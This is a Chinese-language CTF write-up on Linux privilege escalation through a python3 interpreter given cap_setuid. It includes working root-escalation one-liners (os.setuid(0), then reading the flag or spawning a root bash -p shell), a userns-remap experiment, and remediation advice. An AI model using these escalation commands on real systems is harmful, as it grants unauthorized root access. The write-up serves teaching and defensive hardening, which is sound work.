## 二、题目考点

1. **capability 是“细粒度 SUID”**：`setcap cap_setuid+ep` 让文件在**不被 SUID 位标记**的情况下获得“可切换任意 uid”的能力，`find -perm -4000` 完全看不到。
2. **发现手段**：`getcap -r / 2>/dev/null`（或 `getcap -r /usr/bin`）。`getfattr -d -m security.capability` 也能看到 xattr。
3. **`cap_setuid` 的语义**：可直接 `setuid(0)`，等价于拿到 root 身份；`cap_setgid` 换组；`cap_dac_read_search` 绕过读权限（只能读）；`cap_sys_admin` 几乎等于 root。
4. **解释器 + cap 最危险**：给 `python3`/`perl`/`node` 这类可执行任意代码的解释器赋权，等于给整台机器留后门。
5. **软链不改变 cap**：cap 存在真实 inode 上，`python3` 是软链仍会带上 `cap_setuid`。

## 三、解题过程

### 3.1 第一步：常规枚举（找不到）

```bash
find / -xdev -perm -4000 -type f 2>/dev/null
# /usr/lib/openssh/ssh-keysign
# /usr/bin/su  /usr/bin/passwd  /usr/bin/mount  /usr/bin/umount
# /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/sudo
```

全是系统自带，**没有 python** —— 只查 SUID 位会卡在这里。

### 3.2 第二步：换一条“属性”维度

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.12 cap_setuid=ep      <-- 真正的提权面
# /usr/bin/ping cap_net_raw=ep           <-- 干扰项

ls -l /usr/bin/python3 /usr/bin/python3.12
# lrwxrwxrwx 1 root root      10 /usr/bin/python3 -> python3.12
# -rwxr-xr-x 1 root root 8020928 /usr/bin/python3.12      <-- 权限位很普通

cat /opt/install-note.txt
# /usr/bin/python3.12 cap_setuid=ep
# install: setcap cap_setuid+ep /usr/bin/python3.12
```

`cap_setuid` = 可以 `setuid` 到任意用户，包括 0。

### 3.3 第三步：让解释器替我换身份

```bash
python3 -c 'import os; os.setuid(0); os.system("id; cat /flag.txt")'
# uid=0(root) gid=1001(player) groups=1001(player)
# Ly_Flag{hfoogq7b}
```

等价写法（起一个 root shell）：

```bash
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```

注意：`setuid(0)` 之后 gid 仍是 1001，所以更稳妥的写法是先 `setgid(0)` 再 `setuid(0)`，或直接 `os.setresuid(0,0,0)`；本题 flag 是 0400 root，只需要 uid 0 即可。

## 四、userns-remap 下 capability 会不会失效（专项验证）

结论先行：**在本机（Ubuntu 24.04，内核 `7.0.0-38-generic`，Docker 28.5.1，未启用 userns-remap）上，文件 capability 在重映射的用户命名空间里仍然生效，本题在 userns-remap 下依旧可解**；但它只把“root”降级成**命名空间内的 root**（宿主上是 subuid，例如 231072），因此对“容器内的 flag”照样够用。

### 4.1 实验设计

Docker 的 `userns-remap` 本质是 `uid 0(容器) → 231072(宿主)` 的映射。为了不动生产 daemon（改 `daemon.json` 会重启 Docker，并让现有 5 个容器按 remap 重建），这里用 `unshare` 手工构造**等价映射**，对同一个 python 副本执行同样操作：

```bash
cp /usr/bin/python3.12 /tmp/cap_py && chmod 755 /tmp/cap_py
setcap cap_setuid+ep /tmp/cap_py && getcap /tmp/cap_py
# /tmp/cap_py cap_setuid=ep

MAP="--map-users=231072,0,65536 --map-groups=231072,0,65536"
```

### 4.2 实验 A：初始命名空间（等同于现在的部署方式）

```bash
su -s /bin/sh ubuntu24 -c "/tmp/cap_py -c 'import os; print(os.getuid()); os.setuid(0); print(os.getuid())'"
# 1000
# 0              <-- cap 生效，拿到 uid 0
```

### 4.3 实验 B：重映射命名空间（等同于开 userns-remap）

进程在命名空间内是 uid 1000（宿主 232072），不是 ns-root：

```bash
unshare --user $MAP --setuid 1000 --setgid 1000 /tmp/cap_py -c '...'
# start uid 1000 euid 1000
# CapEff: 0000000000000080        <-- bit7 = CAP_SETUID，文件 cap 被内核授予
# after setuid(0) uid = 0         <-- 变成 ns-root（宿主 231072）
```

### 4.4 实验 C：完整复现容器内的题面（关键）

flag 必须由**命名空间内的 root** 创建（题目镜像里 `/flag.txt` 的属主就是 root），否则文件属主是“未映射的宿主 root”，语义就不同了：

```bash
# step1: 以 ns-root 创建 flag（0400）
unshare --user $MAP --setuid 0 /bin/sh -c 'printf "Ly_Flag{userns_inside}\n" > /tmp/nstest2/flag.txt; chmod 400 /tmp/nstest2/flag.txt'
# -r-------- 1 root root 23 /tmp/nstest2/flag.txt

# step2: 普通用户（ns 内 uid 1000）直接读 -> 失败
unshare --user $MAP --setuid 1000 /bin/sh -c 'cat /tmp/nstest2/flag.txt'
# Permission denied

# step3: 同一个普通用户，走带 cap_setuid 的解释器 -> 成功
unshare --user $MAP --setuid 1000 /tmp/cap_py -c 'import os; ...'
# start uid 1000 / CapEff: 0x80 / after setuid(0) uid = 0
# flag: Ly_Flag{userns_inside}
```

### 4.5 结论与部署注意

| 现象 | 结论 |
| --- | --- |
| 文件 cap 在 remap 命名空间里 `CapEff=0x80` | **没有失效**，内核照旧授予 |
| `setuid(0)` 成功 | 得到的是**命名空间 root**（宿主 subuid），读容器内 root 文件足够 |
| `docker run --userns=host`（daemon 已开 remap） | 官方文档明确：容器文件系统**仍**是 remap 属主，`setuid` 程序/`sudo` 行为会异常，不建议混用 |
| 容器内**运行时** `setcap` | 会失败（ns-root 无权写 `security.capability`）；cap 必须在**构建期**设置（本题正是构建期 `setcap`） |
| 镜像层解包时 xattr 丢失（老版本 Docker、部分存储/外部驱动） | `getcap` 变空 → 题不可解，这是**真正的风险点** |

部署冒烟检查（换成任何机器跑一次即可确认）：

```bash
docker run --rm --entrypoint /bin/sh priv-lx06-capabilities:latest -c 'getcap -r / 2>/dev/null'
# 期望：/usr/bin/python3.12 cap_setuid=ep
```

建议：题库统一用 rootful Docker 且**不开** `userns-remap`；确实要开时，用上面这条命令做验收，`getcap` 为空就换机器或关掉 remap。

## 七、修复建议

1. **不要给解释器赋 cap**：`python3`/`perl`/`node`/`bash` 一旦带 `cap_setuid`、`cap_setgid`、`cap_dac_read_search`、`cap_sys_admin`，等同 root。需要特权操作时用**专用最小二进制**（只做那一件事，且自己校验输入）。
2. **最小能力集**：只给必需位（例如仅需绑定低端口给 `cap_net_bind_service`），并优先用 `+ei`（仅 inheritable/环境）而不是 `+ep`。
3. **资产盘点**：`getcap -r / 2>/dev/null` 必须纳入基线巡检；与 `find -perm -4000` 一起跑，二者是不同维度。
4. **审计**：对 `setcap`/`security.capability` 变更做监控（`auditctl -w /usr/bin -p wa`），变更即告警。
5. **部署**：确认镜像层 cap 在目标环境仍然存在（见 4.5 冒烟命令）；`FROM ubuntu:24.04` 未固定 digest，建议固定 sha256。

## 八、教学要点

1. 特殊权限有两个维度：**SUID 位**（看 `ls -l`）和 **capability**（看 `getcap`）。只查一个维度必然漏。
2. `cap_setuid` 是“隐形的 SUID”：文件权限位毫无异常，但执行后可以直接 `setuid(0)`。
3. 解释器 + 任意 cap = 任意代码以该 cap 身份执行；这也是安全基线里“禁止对解释器 setcap”的原因。
4. 拿到 `cap_setuid` 后不必起交互 shell，`os.system("cat /flag.txt")` 一行就够；要交互则 `os.setgid(0); os.setuid(0); os.execl("/bin/bash","bash","-p")`。
5. userns-remap 不是“万能保险”：它把 root 变成命名空间 root，容器内的提权面（文件 cap、SUID）依然可用；真正的边界是**宿主**。
